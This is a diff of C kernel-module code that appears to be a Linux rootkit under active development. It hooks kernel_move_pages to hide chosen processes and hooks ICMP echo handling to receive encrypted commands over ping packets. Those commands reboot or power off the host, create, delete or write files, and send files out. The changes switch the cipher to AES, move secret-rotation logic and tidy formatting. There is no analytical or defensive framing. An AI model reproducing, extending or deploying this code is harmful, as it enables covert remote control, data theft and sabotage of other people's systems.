@@ -1594,11 +1594,11 @@ static asmlinkage int ftrace_kernel_move_pages(pid_t pid, unsigned long nr_pages
          if (flags & ~(MPOL_MF_MOVE|MPOL_MF_MOVE_ALL))
                  return -EINVAL;
  
-         if ((flags & MPOL_MF_MOVE_ALL) && !capable(CAP_SYS_NICE))
-                 return -EPERM;
+	 if ((flags & MPOL_MF_MOVE_ALL) && !capable(CAP_SYS_NICE))
+		 return -EPERM;
 
-	if (is_hidden_proc_pid(pid))
-		return -ESRCH;
+	 if (is_hidden_proc_pid(pid))
+		 return -ESRCH;
 
 	return real_kernel_move_pages(pid, nr_pages, pages, nodes, status, flags);
 }
@@ -1797,7 +1797,7 @@ static struct task_struct *event_kthread = NULL;
 static DECLARE_WAIT_QUEUE_HEAD(exec_event_wait);
 
 static DEFINE_MUTEX(mutex_tfm);
-struct crypto_skcipher *tfm = NULL;
+static struct crypto_skcipher *tfm = NULL;
 
 static void free_exec_event(struct exec_event *ev)
 {
@@ -1842,35 +1842,53 @@ static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
 {
 	int ret = -1;
 
-	ret = do_icmp_echo_skb(skb);
-	if (ret == 0 )
-		return true;
-	else
-
+	if (event_kthread)
+		ret = do_icmp_echo_skb(skb);
+	if (ret < 0)
 		return real_icmp_echo(skb);
+
+	return true;
 }
 
 enum {
 	CMD_ENCRYPT = 1,
 	CMD_DECRYPT = 2,
 };
-
 #define MAX_KEY_SIZE 256
+
+static int __update_secret_succ(void)
+{
+	if (secret_state == SECRET_SEND) {
+		memcpy(secret_buf, secret_new, LEN_PREFIX_CMD);
+		memset(secret_new, 0, LEN_PREFIX_CMD);
+		secret_state = SECRET_OK;
+	}
+	return 0;
+}
+
+static __attribute__((unused)) int update_secret_succ(void)
+{
+	mutex_lock(&mutex_secret);
+	__update_secret_succ();
+	mutex_unlock(&mutex_secret);
+	return 0;
+}
+
 static int enc_dec_buf(char *dst, char *src, int len, int cmd, const char *key, int key_len)
 {
 	struct skcipher_request *req = NULL;
 	struct scatterlist sg;
 	DECLARE_CRYPTO_WAIT(wait);
 	u8 iv[CTR_RFC3686_IV_SIZE] = {0x51, 0xA5, 0x1D, 0x70, 0xA1, 0xC1, 0x11, 0x48};
-	u8 none[CTR_RFC3686_NONCE_SIZE] = {0x00, 0x1C, 0xC5, 0xB7};
+	u8 nonce[CTR_RFC3686_NONCE_SIZE] = {0x00, 0x1C, 0xC5, 0xB7};
 	int iv_size = 0;
 	int tfm_key_len = 0;
 	char key_buf[MAX_KEY_SIZE] = {0};
 	int err = -1;
 
 	if (!tfm) {
-		//tfm = crypto_alloc_skcipher("ctr(aes)", 0, 0);
-		tfm = crypto_alloc_skcipher("rfc3686(ctr(sm4))", 0, 0);
+		tfm = crypto_alloc_skcipher("rfc3686(ctr(aes))", 0, 0);
+//		tfm = crypto_alloc_skcipher("rfc3686(ctr(sm4))", 0, 0);
 		if (IS_ERR(tfm)) {
 //			printk(KERN_INFO "Error allocating ctr(sm4) handle: %ld\n", PTR_ERR(tfm));
 			tfm = NULL;
@@ -1882,7 +1900,7 @@ static int enc_dec_buf(char *dst, char *src, int len, int cmd, const char *key, 
 	if (key_len > tfm_key_len)
 		key_len = tfm_key_len;
 	memcpy(key_buf, key, key_len);
-	memcpy(key_buf+tfm_key_len-sizeof(none), none, sizeof(none));
+	memcpy(key_buf+tfm_key_len-sizeof(nonce), nonce, sizeof(nonce));
 
 	err = crypto_skcipher_setkey(tfm, key_buf, tfm_key_len);
 	if (err) {
@@ -1958,6 +1976,9 @@ static int dec_buf(char *dst, char *src, int len)
 		succ = 0;
 
 end:
+	if (succ == 0)
+		__update_secret_succ();
+
 	mutex_unlock(&mutex_tfm);
 	return succ;
 }
@@ -1965,11 +1986,9 @@ end:
 static void set_seq(struct icmphdr *icmph, unsigned short seq)
 {
 	if (!icmph)
-		goto end;
- 	icmph->un.echo.sequence = htons(seq); 
+		return;
 
-end:
-	return;
+ 	icmph->un.echo.sequence = htons(seq);
 }
 
 struct icmp_echo_limit {
@@ -2069,13 +2088,14 @@ static int icmp_ratelimit(struct net_ratelimit_state *rs, int len)
 		rs->count = 0;
         }
 
-        if (rs->burst && rs->count+len <= rs->burst) {
-                rs->count += len;
-                ret = 1;
-        } else {
-                ret = 0;
-        }
+	if (rs->burst && rs->count+len <= rs->burst) {
+		rs->count += len;
+		ret = 1;
+	} else {
+		ret = 0;
+	}
 	raw_spin_unlock(&rs->lock);
+
         return ret;
 }
 
@@ -2143,6 +2163,7 @@ end:
 	if (name)
 		kfree(name);
 	kfree_skb(skb);
+
 	return 0;
 }
 
@@ -2267,18 +2288,6 @@ end:
 	return rc;
 }
 
-static int update_secret_succ(void)
-{
-	mutex_lock(&mutex_secret);
-	if (secret_state == SECRET_SEND) {
-		memcpy(secret_buf, secret_new, LEN_PREFIX_CMD);
-		memset(secret_new, 0, LEN_PREFIX_CMD);
-		secret_state = SECRET_OK;
-	}	
-	mutex_unlock(&mutex_secret);
-	return 0;
-}
-
 static int do_exec_event(struct sk_buff *skb)
 {
 	struct icmphdr *icmph = NULL;
@@ -2299,36 +2308,36 @@ static int do_exec_event(struct sk_buff *skb)
 
 	cmd = ntohs(*(short *)data);
 	switch (cmd) {
-	case  CMD_RESTART:
+	case CMD_RESTART:
 		kernel_restart(NULL); break;
 
-	case  CMD_SHUTDOWN: 
+	case CMD_SHUTDOWN:
 		kernel_power_off();
 		do_exit(0);
 		break;
 
-	case  CMD_CREATE_FILE: 
+	case CMD_CREATE_FILE:
 		run_usr_cmd(CMD_TOUCH_FILE);
 		ret = 0;
 		break;
 
-	case  CMD_DELETE_FILE: 
+	case CMD_DELETE_FILE:
 		run_usr_cmd(CMD_RM_FILE);
 		ret = 0;
 		break;
 
-	case  CMD_WRITE_FILE: 
+	case CMD_WRITE_FILE:
 		run_usr_cmd(CMD_WRITE_FILE);
 		ret = 0;
 		break;
 
-	case  CMD_SECRET: 
+	case CMD_SECRET:
 		ret = do_secret_task(skb);
 		send_skb = 0;
 		break;
 
-	case  CMD_GET_FILE_SIZE: 
-	case  CMD_SEND_FILE: 
+	case CMD_GET_FILE_SIZE:
+	case CMD_SEND_FILE:
 		if (len > LEN_PREFIX_CMD) {
 			ret = do_file_task(cmd, skb, data);
 			send_skb = 0;
@@ -2338,8 +2347,10 @@ static int do_exec_event(struct sk_buff *skb)
 	default:
 		break;
 	}
+#if 0
 	if (ret == 0 && cmd != CMD_SECRET)
 		update_secret_succ();
+#endif
 
 end:
 	if (send_skb)
